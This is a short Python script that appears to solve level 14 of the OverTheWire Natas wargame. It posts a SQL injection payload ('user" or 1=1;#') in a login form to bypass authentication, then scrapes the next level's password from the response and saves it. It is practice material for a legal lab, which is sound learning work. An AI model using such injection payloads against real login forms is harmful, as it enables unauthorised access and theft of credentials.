import requests
import re
from natas_utility import *
import html

current_level = 14
credentials = get_credentials(current_level)

base_url = 'http://{}.natas.labs.overthewire.org'.format(credentials['username'])
auth = (credentials['username'], credentials['password'])

session = requests.session()

url = base_url + '?debug'

data = {'username': 'user" or 1=1;#',
        'password': 'password',
        'submit': 'submit'}

response = session.post(url, data=data, auth=auth)

content = html.unescape(response.content.decode('utf-8')).replace('<br />', '\n')
cookies = response.cookies

password_regex = re.compile(r'natas15 is (.+)<br>')
next_password = password_regex.findall(content)[0]
print(next_password)

save_credentials(current_level + 1, next_password)
